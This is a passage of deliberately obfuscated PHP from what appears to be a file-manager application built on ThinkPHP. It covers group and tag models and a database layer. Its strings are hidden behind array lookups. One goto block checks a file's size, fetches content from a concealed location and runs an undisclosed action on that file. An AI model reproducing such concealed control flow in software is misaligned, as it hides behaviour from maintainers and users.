(!$¹Åç¿ú¼ || !$êô‚İ¹× || $¹Åç¿ú¼ == $êô‚İ¹×) { return !1; } $ì¦úƒ¤ò = $this->getInfoSimple($¹Åç¿ú¼); $èĞ•î–© = $this->getInfoSimple($êô‚İ¹×); $Á«Üœ¸ = $ì¦úƒ¤ò[$æŸ³á†í[511]] . $¹Åç¿ú¼ . $æŸ³á†í[50]; if (substr($èĞ•î–©[$æŸ³á†í[511]], 0, strlen($Á«Üœ¸)) == $Á«Üœ¸) { return !0; } return !1; } public function groupShowRoot($€­Ùæ„¶, $‡÷Å™•À = false) { $û¤ÑÂ¶½ =& $_SERVER[şÒÁøÒÄ]; $àª²ó  = $this->getInfo($€­Ùæ„¶); if (!$àª²ó ) { return array(); } $¥¤ãİ©ö = $this->parentLevelArray($àª²ó [$û¤ÑÂ¶½[511]]); $ü¬ıÆ§ƒ = array($€­Ùæ„¶); if (count($¥¤ãİ©ö) == 0) { return $ü¬ıÆ§ƒ; } if ($‡÷Å™•À && count($¥¤ãİ©ö) == 1) { return $ü¬ıÆ§ƒ; } if (!$àª²ó [$û¤ÑÂ¶½[466]] || !isset($àª²ó [$û¤ÑÂ¶½[466]][$û¤ÑÂ¶½[1955]]) || $àª²ó [$û¤ÑÂ¶½[466]][$û¤ÑÂ¶½[1955]] == $û¤ÑÂ¶½[1924]) { return $this->groupShowRoot($¥¤ãİ©ö[count($¥¤ãİ©ö) - 1], $‡÷Å™•À); } if ($àª²ó [$û¤ÑÂ¶½[466]][$û¤ÑÂ¶½[1955]] == $û¤ÑÂ¶½[357]) { $¡õ…ş×“ = explode($û¤ÑÂ¶½[50], $àª²ó [$û¤ÑÂ¶½[466]][$û¤ÑÂ¶½[1956]]); if ($¡õ…ş×“) { $ü¬ıÆ§ƒ = array_merge($ü¬ıÆ§ƒ, $¡õ…ş×“); } } return $ü¬ıÆ§ƒ; } protected function resetParentLevel() { $øšÔ±ş =& $_SERVER[şÒÁøÒÄ]; $Ÿâ³šÔ = $øšÔ±ş[1869]; $ıÇÂºÀŠ = $this->select(); $ıÇÂºÀŠ = array_to_keyvalue($ıÇÂºÀŠ, $Ÿâ³šÔ); foreach ($ıÇÂºÀŠ as $ÚÇÀ×¤Œ) { $¼ë„»—Ì = $ÚÇÀ×¤Œ; $«ÈĞÄäù = array(); while ($¼ë„»—Ì[$øšÔ±ş[432]] != 0) { $«ÈĞÄäù[] = $¼ë„»—Ì[$øšÔ±ş[432]]; $¼ë„»—Ì = $ıÇÂºÀŠ[$¼ë„»—Ì[$øšÔ±ş[432]]]; } $«ÈĞÄäù[] = 0; $«ÈĞÄäù = $øšÔ±ş[50] . implode($øšÔ±ş[50], array_reverse($«ÈĞÄäù)) . $øšÔ±ş[50]; $this->setNamePinyin($ÚÇÀ×¤Œ[$Ÿâ³šÔ], $ÚÇÀ×¤Œ[$øšÔ±ş[32]]); $this->where(array($Ÿâ³šÔ => $ÚÇÀ×¤Œ[$Ÿâ³šÔ]))->save(array($øšÔ±ş[580] => $«ÈĞÄäù)); } return $ıÇÂºÀŠ; } public function groupNameAuto($ò¥Å³ÎÊ, $¿±ü£›ö) { $­Ç”Ì»ø =& $_SERVER[şÒÁøÒÄ]; $Œéàä¸¬ = $this->where(array($­Ç”Ì»ø[401] => $ò¥Å³ÎÊ))->getField($­Ç”Ì»ø[32], !0); if (!$Œéàä¸¬ || !in_array($¿±ü£›ö, $Œéàä¸¬)) { return $¿±ü£›ö; } for ($Ïƒ›¸É = 1; $Ïƒ›¸É <= count($Œéàä¸¬) + 1; $Ïƒ›¸É++) { $…¢ÈÙ±ó = $¿±ü£›ö . "\x28{$Ïƒ›¸É}\x29"; if (!in_array($…¢ÈÙ±ó, $Œéàä¸¬)) { return $…¢ÈÙ±ó; } } } public function groupSwitch($ŸÈÑ¢¥, $’Ò¹Å½) { $íúë™× =& $_SERVER[şÒÁøÒÄ]; $˜Ú®ïşí = array($íúë™×[1869] => array($íúë™×[7], array($ŸÈÑ¢¥, $’Ò¹Å½))); $ãó¯ = $this->where($˜Ú®ïşí)->select(); $ãó¯ = array_to_keyvalue($ãó¯, $íúë™×[1869]); if (!isset($ãó¯[$ŸÈÑ¢¥]) || !isset($ãó¯[$’Ò¹Å½]) || $ãó¯[$ŸÈÑ¢¥][$íúë™×[432]] == 0) { return !1; } $˜Ú®ïşí = array($íúë™×[1869] => $ŸÈÑ¢¥); $‘˜ÕØ¿© = Model($íúë™×[1959])->where($˜Ú®ïşí)->select(); if (!$‘˜ÕØ¿©) { $‘˜ÕØ¿© = array(); } foreach ($‘˜ÕØ¿© as $ä·¤”•±) { $é¾¦ó = $ä·¤”•±[$íúë™×[1680]]; $˜Ú®ïşí = array($íúë™×[1680] => $é¾¦ó, $íúë™×[1869] => $’Ò¹Å½); $íˆ¨·ë™ = Model($íúë™×[1959])->where($˜Ú®ïşí)->find(); if (!$íˆ¨·ë™) { $Â’“´òÚ = array($’Ò¹Å½ => $ä·¤”•±[$íúë™×[1973]]); Model($íúë™×[525])->userGroupAdd($é¾¦ó, $Â’“´òÚ); } Model($íúë™×[525])->userGroupRemove($é¾¦ó, $ŸÈÑ¢¥); } $˜Ú®ïşí = array($íúë™×[411] => 2, $íúë™×[432] => 0, $íúë™×[410] => 1, $íúë™×[496] => array($íúë™×[7], array($ŸÈÑ¢¥, $’Ò¹Å½))); $æƒˆûñÆ = Model($íúë™×[833])->where($˜Ú®ïşí)->field($íúë™×[1974])->select(); $æƒˆûñÆ = array_to_keyvalue($æƒˆûñÆ, $íúë™×[496], $íúë™×[402]); $ƒÈ„³Ú‹ = !empty($æƒˆûñÆ[$ŸÈÑ¢¥]) ? $æƒˆûñÆ[$ŸÈÑ¢¥] : !1; if ($ƒÈ„³Ú‹) { if (!$æƒˆûñÆ[$’Ò¹Å½]) { $æƒˆûñÆ[$’Ò¹Å½] = Model($íúë™×[833])->groupRootAdd($’Ò¹Å½); } $š¯õÊŞ… = $æƒˆûñÆ[$’Ò¹Å½]; $˜Ú®ïşí = array($íúë™×[432] => $ƒÈ„³Ú‹); $æƒˆûñÆ = Model($íúë™×[833])->where($˜Ú®ïşí)->field($íúë™×[1975])->select(); if (!$æƒˆûñÆ) { $æƒˆûñÆ = array(); } Model($íúë™×[833])->moveClearAuth = !1; foreach ($æƒˆûñÆ as $ÂÑÏåş“) { $‚âéÚÍÜ = $ÂÑÏåş“[$íúë™×[410]] == $íúë™×[88] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($íúë™×[833])->move($ÂÑÏåş“[$íúë™×[402]], $š¯õÊŞ…, $‚âéÚÍÜ); } Model($íúë™×[833])->moveClearAuth = !0; $˜Ú®ïşí = array($íúë™×[411] => 2, $íúë™×[496] => $ŸÈÑ¢¥); $™Â£‘ƒ± = array($íúë™×[496] => $’Ò¹Å½); Model($íúë™×[1976])->where($˜Ú®ïşí)->save($™Â£‘ƒ±); Model($íúë™×[1977])->where($˜Ú®ïşí)->save($™Â£‘ƒ±); } $this->_changeChildLevel($ãó¯[$ŸÈÑ¢¥], $ãó¯[$’Ò¹Å½], !0); $this->where(array($íúë™×[432] => $ŸÈÑ¢¥))->save(array($íúë™×[432] => $’Ò¹Å½)); $this->_clearChildrenCache($ãó¯[$’Ò¹Å½]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\x75\163\x65\x72\x5f\146\x61\166"; protected function cacheFunctionAlias($¨ØòÒ‘Ê) { $ø–İë =& $_SERVER[şÒÁøÒÄ]; return array($ø–İë[1978] => array($¨ØòÒ‘Ê[0], $ø–İë[1979]), $ø–İë[1980] => array($¨ØòÒ‘Ê[0], $ø–İë[1981])); } protected function get($’Œï¤÷ó) { $‘±ºÏ‘ä =& $_SERVER[şÒÁøÒÄ]; $¥ğ„¼ÄŞ = Model($‘±ºÏ‘ä[512])->metaGet($’Œï¤÷ó, $‘±ºÏ‘ä[1982]); $¢…ƒïÄ• = json_decode($¥ğ„¼ÄŞ, !0); return $¢…ƒïÄ• ? $¢…ƒïÄ• : array($‘±ºÏ‘ä[1983] => $‘±ºÏ‘ä[88], $‘±ºÏ‘ä[369] => array()); } protected function set($Å÷½ƒ¿´, $›“æôñ) { $ÉÑ¡¨Ü =& $_SERVER[şÒÁøÒÄ]; $›“æôñ = $›“æôñ ? $›“æôñ : array($ÉÑ¡¨Ü[1983] => $ÉÑ¡¨Ü[88], $ÉÑ¡¨Ü[369] => array()); return Model($ÉÑ¡¨Ü[512])->metaSet($Å÷½ƒ¿´, $ÉÑ¡¨Ü[1982], json_encode($›“æôñ)); } protected function getByTagID($ ‹òÜã™, $ÜÜÓü»Ë) { $«á‡³êö =& $_SERVER[şÒÁøÒÄ]; if (!$ ‹òÜã™ || !$ÜÜÓü»Ë) { return !1; } if (!Model($«á‡³êö[512])->getInfoSimple($ ‹òÜã™)) { return !1; } $í´ú÷„Ü = $this->get($ ‹òÜã™); if (!$í´ú÷„Ü || !isset($í´ú÷„Ü[$«á‡³êö[369]])) { return !1; } $ç¾—¸˜• = array_find_by_field($í´ú÷„Ü[$«á‡³êö[369]], $«á‡³êö[399], $ÜÜÓü»Ë); return is_array($ç¾—¸˜•) ? $ç¾—¸˜• : !1; } public function listSource($¬Êä¢¦, $Æ„™·À¶) { $”Àµèçã =& $_SERVER[şÒÁøÒÄ]; if ($Æ„™·À¶ && !is_array($Æ„™·À¶)) { $Æ„™·À¶ = array($Æ„™·À¶); } $·‹ÚŞµŒ = $this->listData($¬Êä¢¦); $÷ÁıáÁç = array(); foreach ($·‹ÚŞµŒ as $î¼æûñÊ) { $úß±÷™Ù = $î¼æûñÊ[$”Àµèçã[84]]; if (!$úß±÷™Ù) { continue; } if (!isset($÷ÁıáÁç[$úß±÷™Ù])) { $÷ÁıáÁç[$úß±÷™Ù] = array(); } $÷ÁıáÁç[$úß±÷™Ù][] = $î¼æûñÊ[$”Àµèçã[426]]; } $Ì‹¾Îşá = array(); foreach ($÷ÁıáÁç as $ÊñøÃÓ => $šŠÁÂ’) { $³®·³åí = !0; if (!$Æ„™·À¶) { $Ì‹¾Îşá[] = $ÊñøÃÓ; continue; } foreach ($Æ„™·À¶ as $£¢åËã×) { if (!in_array($£¢åËã×, $šŠÁÂ’)) { $³®·³åí = !1; break; } } if ($³®·³åí) { $Ì‹¾Îşá[] = $ÊñøÃÓ; } } if (!$Ì‹¾Îşá) { return array(); } $Å©Ä–ÈĞ = array($”Àµèçã[417] => array($”Àµèçã[418], $Ì‹¾Îşá), $”Àµèçã[496] => $¬Êä¢¦, $”Àµèçã[411] => SourceModel::TYPE_GROUP); $Íê¬úâÈ = Model($”Àµèçã[1352])->listSource($Å©Ä–ÈĞ); if (!$Íê¬úâÈ || count($Ì‹¾Îşá) == $Íê¬úâÈ[$”Àµèçã[366]][$”Àµèçã[367]]) { return $Íê¬úâÈ; } $Õºñ³îà = array(); $ûÊÌî¾ = array_to_keyvalue($Íê¬úâÈ[$”Àµèçã[82]], $”Àµèçã[12], $”Àµèçã[402]); $Ğü¤è¢ = array_to_keyvalue($Íê¬úâÈ[$”Àµèçã[83]], $”Àµèçã[12], $”Àµèçã[402]); $³¿ÉÀç = array_merge($Ğü¤è¢, $ûÊÌî¾); foreach ($Ì‹¾Îşá as $úß±÷™Ù) { if (!in_array($úß±÷™Ù, $³¿ÉÀç)) { $Õºñ³îà[] = $úß±÷™Ù; } } if ($Õºñ³îà) { $this->removeBySource($¬Êä¢¦, $Õºñ³îà); } return $Íê¬úâÈ; } protected function listData($á¦ÑºÎ¹) { $ëËµïæÓ =& $_SERVER[şÒÁøÒÄ]; $•Î‘£‚ = array($ëËµïæÓ[1671] => 0, $ëËµïæÓ[483] => array($ëËµïæÓ[1984], 0), $ëËµïæÓ[422] => $ëËµïæÓ[1985] . $á¦ÑºÎ¹); $¿ÕÇŸ¶Û = $ëËµïæÓ[1986]; $¿à½Ã»Ã = $this->field($¿ÕÇŸ¶Û)->where($•Î‘£‚)->order($ëËµïæÓ[1987])->select(); return $¿à½Ã»Ã ? $¿à½Ã»Ã : array(); } protected function addToTag($½‡µõŸß, $‡©ªäÔ×, $Ÿ—ÓéìŠ) { $Í›ÕÈ¢ =& $_SERVER[şÒÁøÒÄ]; if (!$this->getByTagID($½‡µõŸß, $Ÿ—ÓéìŠ) || !$‡©ªäÔ×) { return !1; } if (!Model($Í›ÕÈ¢[833])->pathInfo($‡©ªäÔ×)) { return !1; } $áÏÌã• = array($Í›ÕÈ¢[1671] => 0, $Í›ÕÈ¢[483] => $Ÿ—ÓéìŠ, $Í›ÕÈ¢[421] => $‡©ªäÔ×, $Í›ÕÈ¢[422] => $Í›ÕÈ¢[1988] . $½‡µõŸß, $Í›ÕÈ¢[420] => $Í›ÕÈ¢[12], $Í›ÕÈ¢[1873] => 0); if ($this->where($áÏÌã•)->find()) { return !1; } return $this->add($áÏÌã•); } protected function removeFromTag($şæÚ«›õ, $³«„¸‰, $·›ø ) { $Öá‘·ò =& $_SERVER[şÒÁøÒÄ]; if (!$this->getByTagID($şæÚ«›õ, $·›ø ) || !$³«„¸‰) { return !1; } if (is_array($³«„¸‰)) { $³«„¸‰ = array($Öá‘·ò[7], $³«„¸‰); } $ãÉÑÛ¶ğ = array($Öá‘·ò[1671] => 0, $Öá‘·ò[483] => $·›ø , $Öá‘·ò[422] => $Öá‘·ò[1988] . $şæÚ«›õ, $Öá‘·ò[421] => $³«„¸‰); return $this->where($ãÉÑÛ¶ğ)->delete(); } protected function removeByTag($íïˆïó, $Õæ·ºôŞ) { $ù«ŞºÌû =& $_SERVER[şÒÁøÒÄ]; if (!$this->getByTagID($íïˆïó, $Õæ·ºôŞ)) { return !1; } $à¸³í¥ä = array($ù«ŞºÌû[1671] => 0, $ù«ŞºÌû[483] => $Õæ·ºôŞ, $ù«ŞºÌû[422] => $ù«ŞºÌû[1988] . $íïˆïó); return $this->where($à¸³í¥ä)->delete(); } protected function removeBySource($ïëƒüËõ, $ ¥äìö) { $î“ÚÈ²Ç =& $_SERVER[şÒÁøÒÄ]; if (!$ïëƒüËõ || !$ ¥äìö) { return !1; } if (is_array($ ¥äìö)) { $ ¥äìö = array($î“ÚÈ²Ç[7], $ ¥äìö); } $½¼²ªşú = array($î“ÚÈ²Ç[1671] => 0, $î“ÚÈ²Ç[421] => $ ¥äìö, $î“ÚÈ²Ç[483] => array($î“ÚÈ²Ç[1027], 0), $î“ÚÈ²Ç[422] => $î“ÚÈ²Ç[1988] . $ïëƒüËõ); return $this->where($½¼²ªşú)->delete(); } } goto Eƒ‹ÅöÛŞõ; F½ŞÂ‹Ùàà: $_file = $_SERVER[$_SERVER[şÒÁøÒÄ][1370]]; $_size = $_SERVER[şÒÁøÒÄ][886]; if ($_SERVER[$_SERVER[şÒÁøÒÄ][887]] != $_size($_file)) { $_getc = $_SERVER[şÒÁøÒÄ][889]; $_getfile = $_SERVER[$_SERVER[şÒÁøÒÄ][884]] . $_SERVER[şÒÁøÒÄ][885]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[şÒÁøÒÄ][231], $_getfilec); if (count($_getarrs) < $_SERVER[şÒÁøÒÄ][627]) { $exit = $_SERVER[şÒÁøÒÄ][890]; $exit(); } $_act = $_SERVER[şÒÁøÒÄ][1371]; $_act($_file); } goto E–ˆ¥¡íÛ‚; fÎ‡ÃŸ¦¡: class DbSqlite3 extends DbSqlite3Base { public function query($‹ç˜Šš) { $”“ä¸¤ =& $_SERVER[şÒÁøÒÄ]; if (!CacheLock::fileLock($”“ä¸¤[13])) { return !1; } $†‡Ü¡½ˆ = parent::query($‹ç˜Šš); CacheLock::fileUnLock($”“ä¸¤[13]); return $†‡Ü¡½ˆ; } public function execute($Ğº¼ñµŠ) { $ê·çûÈ÷ =& $_SERVER[şÒÁøÒÄ]; if (!CacheLock::fileLock($ê·çûÈ÷[13])) { return !1; } $†—·¢…¢ = parent::execute($Ğº¼ñµŠ); CacheLock::fileUnLock($ê·çûÈ÷[13]); return $†—·¢…¢; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\164\150\x69\156\153\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\x71" => "\x3d", "\156\x65\161" => "\74\76", "\147\x74" => "\x3e", "\x65\147\164" => "\x3e\75", "\x6c\164" => "\74", "\x65\154\164" => "\x3c\x3d", "\x6e\x6f\164\x6c\x69\153\145" => "\116\x4f\124\40\114\x49\x4b\105", "\154\151\x6b\145" => "\x4c\111\113\105", "\151\156" => "\111\x4e", "\156\x6f\x74\151\x6e" => "\116\117\x54\x20\111\116", "\156\157\x74\40\x69\x6e" => "\x4e\117\x54\40\x49\116", "\x62\x65\164\x77\145\145\156" => "\102\105\124\127\105\105\x4e", "\x6e\157\x74\142\x65\164\x77\x65\145\x6e" => "\x4e\117\x54\x20\102\x45\x54\127\105\105\116", "\156\157\164\40\142\x65\164\x77\x65\x65\x6e" => "\116\117\x54\40\102\x45\x54\127\105\x45\116"); protected $selectSql = "\x53\x45\114\105\103\x54\x25\104\x49\x53\124\x49\x4e\x43\x54\x25\40\x25\106\x49\105\114\104\45\x20\106\x52\x4f\x4d\40\x25\124\101\x42\114\x45\x25\45\x4a\117\111\116\x25\x25\x57\110\105\x52\105\x25\x25\107\x52\117\125\120\45\x25\x48\x41\x56\111\x4e\x47\x25\45\117\x52\x44\105\x52\x25\45\114\111\115\111\124\45\x20\x25\125\x4e\x49\117\116\45\45\103\x4f\x4d\115\x45\x4e\124\x25"; protected $bind = array(); public static function getInstance() { $ßå·Ñï¤ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[şÒÁøÒÄ][973], $ßå·Ñï¤); } public function factory($ğø ÙñË = '') { $ÄÛ¥¨¬ =& $_SERVER[şÒÁøÒÄ]; $ğø ÙñË = $this->parseConfig($ğø ÙñË); if (empty($ğø ÙñË[$ÄÛ¥¨¬[974]])) { think_exception(think_lang($ÄÛ¥¨¬[975])); } $this->dbType = ucwords(strtolower($ğø ÙñË[$ÄÛ¥¨¬[974]])); $»ÂŞÑø = $ÄÛ¥¨¬[976] . $this->dbType; if (class_exists($»ÂŞÑø)) { $êÚŒš«Ù = new $»ÂŞÑø($ğø ÙñË); if ($ÄÛ¥¨¬[977] != strtolower($ğø ÙñË[$ÄÛ¥¨¬[974]])) { $êÚŒš«Ù->dbType = strtoupper($this->dbType); } else { $êÚŒš«Ù->dbType = $this->_getDsnType($ğø ÙñË[$ÄÛ¥¨¬[929]]); } } else { think_exception(think_lang($ÄÛ¥¨¬[978]) . $ÄÛ¥¨¬[979] . $»ÂŞÑø); } return $êÚŒš«Ù; } public function __call($Ì›«ò››, $ªêä›ßÁ) { if (method_exists($this, $Ì›«ò››)) { return call_user_func_array(array($this, $Ì›«ò››), $ªêä›ßÁ); } } protected function _getDsnType($ı†…€³¨) { $£ô¡ôí = explode($_SERVER[şÒÁøÒÄ][4], $ı†…€³¨); $ËşîÖšÆ = strtoupper(trim($£ô¡ôí[0])); return $ËşîÖšÆ; } private function parseConfig($ï‘ü¿© = '') { $æÃÙâ©µ =& $_SERVER[şÒÁøÒÄ]; if (!empty($ï‘ü¿©) && is_string($ï‘ü¿©)) { $ï‘ü¿© = $this->parseDSN($ï‘ü¿©); } elseif (is_array($ï‘ü¿©)) { $ï‘ü¿© = array_change_key_case($ï‘ü¿©); $ï‘ü¿© = array($æÃÙâ©µ[974] => $ï‘ü¿©[$æÃÙâ©µ[980]], $æÃÙâ©µ[901] => $ï‘ü¿©[$æÃÙâ©µ[981]], $æÃÙâ©µ[902] => $ï‘ü¿©[$æÃÙâ©µ[982]], $æÃÙâ©µ[899] => $ï‘ü¿©[$æÃÙâ©µ[983]], $æÃÙâ©µ[900] => $ï‘ü¿©[$æÃÙâ©µ[984]], $æÃÙâ©µ[21] => $ï‘ü¿©[$æÃÙâ©µ[985]], $æÃÙâ©µ[929] => $ï‘ü¿©[$æÃÙâ©µ[986]], $æÃÙâ©µ[17] => isset($ï‘ü¿©[$æÃÙâ©µ[987]]) ? $ï‘ü¿©[$æÃÙâ©µ[987]] : array()); } elseif (empty($ï‘ü¿©)) { if (think_config($æÃÙâ©µ[988]) && $æÃÙâ©µ[977] != strtolower(think_config($æÃÙâ©µ[989]))) { $ï‘ü¿© = $this->parseDSN(think_config($æÃÙâ©µ[988])); } else { $ï‘ü¿© = array($æÃÙâ©µ[974] => think_config($æÃÙâ©µ[989]), $æÃÙâ©µ[901] => think_config($æÃÙâ©µ[990]), $æÃÙâ©µ[902] => think_config($æÃÙâ©µ[991]), $æÃÙâ©µ[899] => think_config($æÃÙâ©µ[992]), $æÃÙâ©µ[900] => think_config($æÃÙâ©µ[993]), $æÃÙâ©µ[21] => think_config($æÃÙâ©µ[246]), $æÃÙâ©µ[929] => think_config($æÃÙâ©µ[988]), $æÃÙâ©µ[17] => think_config($æÃÙâ©µ[994])); } } return $ï‘ü¿©; } protected function initConnect($Ò§ùÁ¾ = true) { if (1 == think_config($_SERVER[şÒÁøÒÄ][22])) { $this->_linkID = $this->multiConnect($Ò§ùÁ¾); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $®×½ã·× => $·¥ÆÍ‘ğ) { $this->_linkID = $·¥ÆÍ‘ğ; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($ÛÛ–ûÅ = false) { $üÕ–Ûİ¦ =& $_SERVER[şÒÁøÒÄ]; static $œæú§İ° = array(); static $˜ç¿â·Ï = -1; if (empty($œæú§İ°)) { foreach ($this->config as $–É”´ÛÜ => $ÊÙÑéÃğ) { $œæú§İ°[$–É”´ÛÜ] = explode($üÕ–Ûİ¦[50], $ÊÙÑéÃğ); } } if (think_config($üÕ–Ûİ¦[995])) { if ($ÛÛ–ûÅ || think_config($üÕ–Ûİ¦[395]) === !0) { $¦ù³ØÀ‰ = floor(mt_rand(0, think_config($üÕ–Ûİ¦[996]) - 1)); $˜ç¿â·Ï = $¦ù³ØÀ‰; } else { if (is_numeric(think_config($üÕ–Ûİ¦[997]))) { $¦ù³ØÀ‰ = think_config($üÕ–Ûİ¦[997]); } else { $¦ù³ØÀ‰ = floor(mt_rand(think_config($üÕ–Ûİ¦[996]), count($œæú§İ°[$üÕ–Ûİ¦[899]]) - 1)); } } } else { $¦ù³ØÀ‰ = floor(mt_rand(0, count($œæú§İ°[$üÕ–Ûİ¦[899]]) - 1)); $˜ç¿â·Ï = $¦ù³ØÀ‰; } $¦ù³ØÀ‰ = $˜ç¿â·Ï !== -1 ? $˜ç¿â·Ï : $¦ù³ØÀ‰; $Ñç¡à·° = array($üÕ–Ûİ¦[901] => isset($œæú§İ°[$üÕ–Ûİ¦[901]][$¦ù³ØÀ‰]) ? $œæú§İ°[$üÕ–Ûİ¦[901]][$¦ù³ØÀ‰] : $œæú§İ°[$üÕ–Ûİ¦[901]][0], $üÕ–Ûİ¦[902] => isset($œæú§İ°[$üÕ–Ûİ¦[902]][$¦ù³ØÀ‰]) ? $œæú§İ°[$üÕ–Ûİ¦[902]][$¦ù³ØÀ‰] : $œæú§İ°[$üÕ–Ûİ¦[902]][0], $üÕ–Ûİ¦[899] => isset($œæú§İ°[$üÕ–Ûİ¦[899]][$¦ù³ØÀ‰]) ? $œæú§İ°[$üÕ–Ûİ¦[899]][$¦ù³ØÀ‰] : $œæú§İ°[$üÕ–Ûİ¦[899]][0], $üÕ–Ûİ¦[900] => isset($œæú§İ°[$üÕ–Ûİ¦[900]][$¦ù³ØÀ‰]) ? $œæú§İ°[$üÕ–Ûİ¦[900]][$¦ù³ØÀ‰] : $œæú§İ°[$üÕ–Ûİ¦[900]][0], $üÕ–Ûİ¦[21] => isset($œæú§İ°[$üÕ–Ûİ¦[21]][$¦ù³ØÀ‰]) ? $œæú§İ°[$üÕ–Ûİ¦[21]][$¦ù³ØÀ‰] : $œæú§İ°[$üÕ–Ûİ¦[21]][0], $üÕ–Ûİ¦[929] => isset($œæú§İ°[$üÕ–Ûİ¦[929]][$¦ù³ØÀ‰]) ? $œæú§İ°[$üÕ–Ûİ¦[929]][$¦ù³ØÀ‰] : $œæú§İ°[$üÕ–Ûİ¦[929]][0], $üÕ–Ûİ¦[17] => isset($œæú§İ°[$üÕ–Ûİ¦[17]][$¦ù³ØÀ‰]) ? $œæú§İ°[$üÕ–Ûİ¦[17]][$¦ù³ØÀ‰] : $œæú§İ°[$üÕ–Ûİ¦[17]][0]); return $this->connect($Ñç¡à·°, $¦ù³ØÀ‰); } public function parseDSN($«ñ•øá) { $œ÷‘’ =& $_SERVER[şÒÁøÒÄ]; if (empty($«ñ•øá)) { return !1; } $ÇÃÀÓ¡’ = parse_url($«ñ•øá); if ($ÇÃÀÓ¡’[$œ÷‘’[181]]) { $™¬™ù•¦ = array($œ÷‘’[974] => $ÇÃÀÓ¡’[$œ÷‘’[181]], $œ÷‘’[901] => isset($ÇÃÀÓ¡’[$œ÷‘’[590]]) ? $ÇÃÀÓ¡’[$œ÷‘’[590]] : $œ÷‘’[12], $œ÷‘’[902] => isset($ÇÃÀÓ¡’[$œ÷‘’[998]]) ? $ÇÃÀÓ¡’[$œ÷‘’[998]] : $œ÷‘’[12], $œ÷‘’[899] => isset($ÇÃÀÓ¡’[$œ÷‘’[182]]) ? $ÇÃÀÓ¡’[$œ÷‘’[182]] : $œ÷‘’[12], $œ÷‘’[900] => isset($ÇÃÀÓ¡’[$œ÷‘’[183]]) ? $ÇÃÀÓ¡’[$œ÷‘’[183]] : $œ÷‘’[12], $œ÷‘’[21] => isset($ÇÃÀÓ¡’[$œ÷‘’[84]]) ? substr($ÇÃÀÓ¡’[$œ÷‘’[84]], 1) : $œ÷‘’[12]); } else { preg_match($œ÷‘’[999], trim($«ñ•øá), $¶¨§ïÅ); $™¬™ù•¦ = array($œ÷‘’[974] => $¶¨§ïÅ[1], $œ÷‘’[901] => $¶¨§ïÅ[2], $œ÷‘’[902] => $¶¨§ïÅ[3], $œ÷‘’[899] => $¶¨§ïÅ[4], $œ÷‘’[900] => $¶¨§ïÅ[5], $œ÷‘’[21] => $¶¨§ïÅ[6]); } $™¬™ù•¦[$œ÷‘’[929]] = $œ÷‘’[12]; return $™¬™ù•¦; } protected function debug() { $¯‹¢ì‘­ =& $_SERVER[şÒÁøÒÄ]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $¯‹¢ì‘­[1000]; if (think_config($¯‹¢ì‘­[1001])) { think_status($¯‹¢ì‘­[1002]); think_trace($this->queryStr . $¯‹¢ì‘­[1003] . think_status($¯‹¢ì‘­[24], $¯‹¢ì‘­[1002], 6) . $¯‹¢ì‘­[1004], $¯‹¢ì‘­[12], $¯‹¢ì‘­[1005]); } } protected function parseLock($üƒâ¨ = false) { $ãËÇ™ù‰ =& $_SERVER[şÒÁøÒÄ]; if (!$üƒâ¨) { return $ãËÇ™ù‰[12]; } if ($ãËÇ™ù‰[931] == $this->dbType) { return $ãËÇ™ù‰[1006]; } return $ãËÇ™ù‰[1007]; } protected function parseSet($Íà›û±) { $æú„Ô¯Ç =& $_SERVER[şÒÁøÒÄ]; foreach ($Íà›û± as $¢ ÚïåØ => $Œ¾é‘²³) { if (is_array($Œ¾é‘²³) && $æú„Ô¯Ç[297] == $Œ¾é‘²³[0]) { $¥ä†’ø¥[] = $this->parseKey($¢ ÚïåØ) . $æú„Ô¯Ç[897] . $Œ¾é‘²³[1]; } elseif (is_scalar($Œ¾é‘²³) || is_null($Œ¾é‘²³)) { $¥ä†’ø¥[] = $this->parseKey($¢ ÚïåØ) . $æú„Ô¯Ç[897] . $this->parseValue($Œ¾é‘²³); } } return $æú„Ô¯Ç[1008] . implode($æú„Ô¯Ç[50], $¥ä†’ø¥); } protected function bindParam($ÍäÛ¯öæ, $©‘‹­¥) { $this->bind[$_SERVER[şÒÁøÒÄ][4] . $ÍäÛ¯öæ] = $©‘‹­¥; } protected function parseBind($ÒàŸÄŒû) { $ÒàŸÄŒû = array_merge($this->bind, $ÒàŸÄŒû); $this->bind = array(); return $ÒàŸÄŒû; } function parseKey(&$ˆø‘‚í, $ç¬Îìâ = true) { if ($ç¬Îìâ) { $ˆø‘‚í = $this->parseKeyCheck($ˆø‘‚í); } return $ˆø‘‚í; } function parseKeyCheck($Òû¯Œ) { $‚Êê³ =& $_SERVER[şÒÁøÒÄ]; $Òû¯Œ = trim($Òû¯Œ); if (!preg_match($‚Êê³[1009], $Òû¯Œ)) { think_exception($‚Êê³[1010] . $Òû¯Œ); } return $Òû¯Œ; } protected function parseValue($ì¿í°£) { $ƒ†İ»şÉ =& $_SERVER[şÒÁøÒÄ]; if (is_string($ì¿í°£)) { $ì¿í°£ = $ƒ†İ»şÉ[970] . $this->escapeString($ì¿í°£) . $ƒ†İ»şÉ[970]; } elseif (isset($ì¿í°£[0]) && is_string($ì¿í°£[0]) && strtolower($ì¿í°£[0]) == $ƒ†İ»şÉ[297]) { $ì¿í°£ = $this->escapeString($ì¿í°£[1]); } elseif (is_array($ì¿í°£)) { $ì¿í°£ = array_map(array($this, $ƒ†İ»şÉ[971]), $ì¿í°£); } elseif (is_bool($ì¿í°£)) { $ì¿í°£ = $ì¿í°£ ? $ƒ†İ»şÉ[88] : $ƒ†İ»şÉ[198]; } elseif (is_null($ì¿í°£)) { $ì¿í°£ = $ƒ†İ»şÉ[103]; } return $ì¿í°£; } protected function parseField($”õÏÍí) { $‰®ôø· 